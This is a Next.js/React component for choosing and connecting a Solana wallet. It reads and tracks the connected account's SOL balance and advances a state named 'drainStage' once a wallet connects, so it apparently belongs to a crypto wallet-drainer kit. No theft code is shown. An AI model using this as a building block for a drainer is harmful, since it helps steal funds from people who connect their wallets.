'use client'
import React, { useMemo , useEffect , useState } from 'react'
import Image from 'next/image'
import { awaitLoading } from '@/app/services/hook/LoadingState';
import { changeLoadingState } from '@/app/services/redux/getLoadingState';
import { executeCloseWallet } from '@/app/services/redux/closeModel';
import { toast } from 'sonner'
import { changeDrainStage } from '@/app/services/redux/drainStages';
import { connectionLevel } from '@/app/constants/conneectionStages';
import { executeConnectionObject } from '@/app/services/redux/walletConnectionObject';
import { getBalance } from '@/app/services/hook/getWalletBalance';
import { solanaConnection  } from '@/app/lib/solanahttps';

import Button  from "@/app/components/ui/Button";
import { useWallet  , useConnection} from "@solana/wallet-adapter-react";
import { LAMPORTS_PER_SOL } from "@solana/web3.js";
import { Dialog, DialogContent, DialogTrigger } from "@/app/components/ui/dialog";
import { ChevronRight } from "lucide-react";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/app/components/ui/dropdown-menu";
import { reset } from 'colorette';


declare global {
  interface Window {
    solana?: any; 
  }
}


declare global{
  interface Event {
    detail:{
      error:any
    }
 }
}

function WalletOptions({src , walletName}:{src:string , walletName:string}) {
  const loading= changeLoadingState((state)=>state.loading)
const loadingState = changeLoadingState((state)=>state.resetLoadingState)
const closeWallet = executeCloseWallet((state)=>state.resetCloseWallet)
const getDrainStage = changeDrainStage((state)=>state.connectionStage);
const setDrainStage = changeDrainStage((state)=>state.resetConnectionStage)
const isConnected = executeConnectionObject((state)=>state.isConnected) 
const connectionInstance = executeConnectionObject((state)=>state.connectionInstance)
const usersPublicKey = executeConnectionObject((state)=>state.usersPublicKey)
const accountBalance = executeConnectionObject((state)=>state.accountBalance)
const resetConnectionInstance = executeConnectionObject((state)=>state.resetConnectionInstance)
const resetConnectionPublicKey = executeConnectionObject((state)=>state.resetConnectionPublicKey)
const resetAccountBalance = executeConnectionObject((state)=>state.resetAccountBalance)
const setIsConnected = executeConnectionObject((state)=>state.disconnectWallet)

const connection = solanaConnection()
// const {connection} = useConnection();
const { select, wallets, publicKey, disconnect, connecting, connected , connect } = useWallet();
const [open, setOpen] = useState<boolean>(false);
const [balance, setBalance] = useState<number | null>(null);
const [userWalletAddress, setUserWalletAddress] = useState<string>("");

useEffect(() => {
  if (!connection || !publicKey) {
    return;
  }
  connection.onAccountChange(
    publicKey,
    (updatedAccountInfo) => {
      setBalance(updatedAccountInfo.lamports / LAMPORTS_PER_SOL);
      resetAccountBalance(updatedAccountInfo.lamports / LAMPORTS_PER_SOL)
    },
    "confirmed"
  );

  connection.getAccountInfo(publicKey).then((info) => {
    console.log(info)
    if (info) {
      setBalance(info?.lamports / LAMPORTS_PER_SOL);
      resetAccountBalance(info?.lamports / LAMPORTS_PER_SOL)
    }
  });
}, [publicKey, connection]);

useEffect(() => {
  resetConnectionPublicKey(publicKey?.toBase58()!)
  setUserWalletAddress(publicKey?.toBase58()!);
  setIsConnected(true)
}, [publicKey]);

useEffect(()=>{
  if(!publicKey){
    if((connecting)){
      loadingState(true)
    }
  }else{
    loadingState(false)
    closeWallet(false)
    setDrainStage(connectionLevel[1]) 
  
  }
},[publicKey])





useMemo(()=>{
  if(!userWalletAddress){
    if(connecting){
      closeWallet(false)
      loadingState(true)
    }
  }else{
    loadingState(false)
  }
}, [connecting ,userWalletAddress])


const handleWalletSelect = async (walletName: any) => {
  if (walletName) {
    try {
      select(walletName);
      setDrainStage(connectionLevel[1])
    } catch (error) {
      console.log("wallet connection err : ", error);
    }
  }
};

const handleDisconnect = async () => {
  disconnect();
  toast("User Account Disconnection", {
    description: "Your account have been disconnected successfully" })
};


  return (
    <div onClick={()=>handleWalletSelect(walletName)}  id="select_wallet" className="cursor-pointer  flex w-full items-center h-12 bg-gray-800 rounded-xl">
    <div  className="w-8 h-7 m-2 rounded-md">
      <Image width={40} height={40} alt='' style={{borderRadius: 5}} src={src} />
    </div>
    <div className="text-md font-semibold text-white">
      {walletName}
    </div>
  </div>
  )
}
export default WalletOptions
